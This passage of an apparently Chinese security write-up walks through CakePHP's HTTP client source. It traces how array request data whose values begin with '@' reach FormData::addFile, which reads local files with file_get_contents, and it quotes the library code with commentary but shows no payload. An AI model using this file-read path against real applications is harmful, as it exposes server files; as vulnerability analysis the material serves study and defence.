class="line">$http = <span class="keyword">new</span> Client();</span><br><span class="line"><span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中才真正调用了CakePHP的远程请求API<code>$http-&gt;$method($url, $data, $options)</code>，跟进到CakePHP的API中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$http = <span class="keyword">new</span> Client();</span><br><span class="line"><span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br></pre></td></tr></table></figure><p>Client类是从<code>Cake\Http\Client</code>中调用的，这个类位于<code>\vendor\cakephp\cakephp\src\Http\Client.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;setConfig($config);</span><br><span class="line"></span><br><span class="line">$adapter = <span class="keyword">$this</span>-&gt;_config[<span class="string">'adapter'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;setConfig(<span class="string">'adapter'</span>, <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">if</span> (is_string($adapter)) &#123;</span><br><span class="line">$adapter = <span class="keyword">new</span> $adapter();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_adapter = $adapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;_config[<span class="string">'cookieJar'</span>])) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_cookies = <span class="keyword">$this</span>-&gt;_config[<span class="string">'cookieJar'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;setConfig(<span class="string">'cookieJar'</span>, <span class="keyword">null</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_cookies = <span class="keyword">new</span> CookieCollection();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Do a GET request.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* The $data argument supports a special `_content` key</span></span><br><span class="line"><span class="comment">* for providing a request body in a GET request. This is</span></span><br><span class="line"><span class="comment">* generally not used, but services like ElasticSearch use</span></span><br><span class="line"><span class="comment">* this feature.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url or path you want to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $data The query data you want to send.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options Additional options for the request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url, $data = [], array $options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</span><br><span class="line">$body = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'_content'</span>])) &#123;</span><br><span class="line">$body = $data[<span class="string">'_content'</span>];</span><br><span class="line"><span class="keyword">unset</span>($data[<span class="string">'_content'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$url = <span class="keyword">$this</span>-&gt;buildUrl($url, $data, $options);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(</span><br><span class="line">Request::METHOD_GET,</span><br><span class="line">$url,</span><br><span class="line">$body,</span><br><span class="line">$options</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Do a POST request.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url or path you want to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The post data you want to send.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options Additional options for the request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($url, $data = [], array $options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</span><br><span class="line">$url = <span class="keyword">$this</span>-&gt;buildUrl($url, [], $options);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(Request::METHOD_POST, $url, $data, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个函数最后进行请求的时候都调用了<code>$this-&gt;_doRequest(Request::METHOD_POST|Request::METHOD_GET, $url, $data, $options);</code>，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Helper method for doing non-GET requests.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $method HTTP method.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url URL to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The request body.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options The options to use. Contains auth, proxy, etc.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_doRequest</span><span class="params">($method, $url, $data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;_createRequest(</span><br><span class="line">$method,</span><br><span class="line">$url,</span><br><span class="line">$data,</span><br><span class="line">$options</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;send($request, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又调用了<code>$this-&gt;_createRequest($method,$url,$data,$options);</code>继续跟<code>_createRequest</code>看它对输入的url和data都做了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Creates a new request object based on the parameters.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $method HTTP method name.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url including query string.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The request body.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options The options to use. Contains auth, proxy, etc.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Request</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_createRequest</span><span class="params">($method, $url, $data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$headers = <span class="keyword">isset</span>($options[<span class="string">'headers'</span>]) ? (<span class="keyword">array</span>)$options[<span class="string">'headers'</span>] : [];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'type'</span>])) &#123;</span><br><span class="line">$headers = array_merge($headers, <span class="keyword">$this</span>-&gt;_typeHeaders($options[<span class="string">'type'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (is_string($data) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">'Content-Type'</span>]) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">'content-type'</span>])) &#123;</span><br><span class="line">$headers[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$request = <span class="keyword">new</span> Request($url, $method, $headers, $data);</span><br><span class="line">$cookies = <span class="keyword">isset</span>($options[<span class="string">'cookies'</span>]) ? $options[<span class="string">'cookies'</span>] : [];</span><br><span class="line"><span class="comment">/** <span class="doctag">@var</span> \Cake\Http\Client\Request $request */</span></span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;_cookies-&gt;addToRequest($request, $cookies);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'auth'</span>])) &#123;</span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;_addAuthentication($request, $options);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'proxy'</span>])) &#123;</span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;_addProxy($request, $options);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $request;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第20行在请求的时候创建了一个Request对象进行请求<code>new Request($url, $method, $headers, $data);</code><br>Request类位于<code>\Cake\Http\Client\Request</code>，在<code>\vendor\cakephp\cakephp\src\Http\Client\Request.php</code>中，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span> <span class="keyword">extends</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">RequestInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">RequestTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Provides backwards compatible defaults for some properties.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url The request URL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $method The HTTP method to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $headers The HTTP headers to set.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array|string|null $data The request body to use.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url = <span class="string">''</span>, $method = self::METHOD_GET, array $headers = [], $data = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;validateMethod($method);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uri = <span class="keyword">$this</span>-&gt;createUri($url);</span><br><span class="line">        $headers += [</span><br><span class="line">            <span class="string">'Connection'</span> =&gt; <span class="string">'close'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span> =&gt; <span class="string">'CakePHP'</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;addHeaders($headers);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get/set the body/payload for the message.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Array data will be serialized with Cake\Http\FormData,</span></span><br><span class="line"><span class="comment">     * and the content-type will be set.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|array|null $body The body for the request. Leave null for get</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed Either $this or the body value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">body</span><span class="params">($body = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($body === <span class="keyword">null</span>) &#123;</span><br><span class="line">            $body = <span class="keyword">$this</span>-&gt;getBody();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $body ? $body-&gt;__toString() : <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($body)) &#123;</span><br><span class="line">            $formData = <span class="keyword">new</span> FormData();</span><br><span class="line">            $formData-&gt;addMany($body);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;header(<span class="string">'Content-Type'</span>, $formData-&gt;contentType());</span><br><span class="line">            $body = (string)$formData;</span><br><span class="line">        &#125;</span><br><span class="line">        $stream = <span class="keyword">new</span> Stream(<span class="string">'php://memory'</span>, <span class="string">'rw'</span>);</span><br><span class="line">        $stream-&gt;write($body);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stream = $stream;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在第25行的构造函数中使用<code>$this-&gt;body($data)</code>将data放在了body中，而在body函数中有一行代码判断data是否为数组，body函数的文档中还提到了<code>Array data will be serialized with Cake\Http\FormData</code>,也就是说如果是数组的话会new一个FormData对象，并且将data添加到FormData中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (is_array($body)) &#123;</span><br><span class="line"> $formData = <span class="keyword">new</span> FormData();</span><br><span class="line"> $formData-&gt;addMany($body);</span><br><span class="line"> <span class="keyword">$this</span>-&gt;header(<span class="string">'Content-Type'</span>, $formData-&gt;contentType());</span><br><span class="line"> $body = (string)$formData;</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>跟到FormData中，位于Cake\Http\FormData</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FormData</span> <span class="keyword">implements</span> <span class="title">Countable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add a new part to the data.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The value for a part can be a string, array, int,</span></span><br><span class="line"><span class="comment">     * float, filehandle, or object implementing __toString()</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If the $value is an array, multiple parts will be added.</span></span><br><span class="line"><span class="comment">     * Files will be read from their current position and saved in memory.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|\Cake\Http\Client\FormData $name The name of the part to add,</span></span><br><span class="line"><span class="comment">     *   or the part data object.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value The value for the part.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($name, $value = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addRecursive($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">'@'</span>) &#123;</span><br><span class="line">            trigger_error(</span><br><span class="line">                <span class="string">'Using the @ syntax for file uploads is not safe and is deprecated. '</span> .</span><br><span class="line">                <span class="string">'Instead you should use file handles.'</span>,</span><br><span class="line">                E_USER_DEPRECATED</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add multiple parts at once.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Iterates the parameter and adds all the key/values.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data Array of data to add.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMany</span><span class="params">(array $data)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;add($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add either a file reference (string starting with @)</span></span><br><span class="line"><span class="comment">     * or a file handle.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $name The name to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value Either a string filename, or a filehandle.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Cake\Http\Client\FormDataPart</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_hasFile = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="keyword">false</span>;</span><br><span class="line">        $contentType = <span class="string">'application/octet-stream'</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource($value)) &#123;</span><br><span class="line">            $content = stream_get_contents($value);</span><br><span class="line">            <span class="keyword">if</span> (stream_is_local($value)) &#123;</span><br><span class="line">                $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">                $metadata = stream_get_meta_data($value);</span><br><span class="line">                $contentType = $finfo-&gt;file($metadata[<span class="string">'uri'</span>]);</span><br><span class="line">                $filename = basename($metadata[<span class="string">'uri'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">            $value = substr($value, <span class="number">1</span>);</span><br><span class="line">            $filename = basename($value);</span><br><span class="line">            $content = file_get_contents($value);</span><br><span class="line">            $contentType = $finfo-&gt;file($value);</span><br><span class="line">        &#125;</span><br><span class="line">        $part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</span><br><span class="line">        $part-&gt;type($contentType);</span><br><span class="line">        <span class="keyword">if</span> ($filename) &#123;</span><br><span class="line">            $part-&gt;filename($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;add($part);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $part;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>addMany($body)</code>函数中将data数组进行了处理，将data数组里的每一个键和值都用<code>$this-&gt;add($name, $value)</code>加入到body中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;add($name, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看add函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($name, $value = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;addRecursive($name, $value);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">'@'</span>) &#123;</span><br><span class="line">trigger_error(</span><br><span class="line"><span class="string">'Using the @ syntax for file uploads is not safe and is deprecated. '</span> .</span><br><span class="line"><span class="string">'Instead you should use file handles.'</span>,</span><br><span class="line">E_USER_DEPRECATED</span><br><span class="line">);</span><br><span class="line"><span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_parts[] = $name;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span 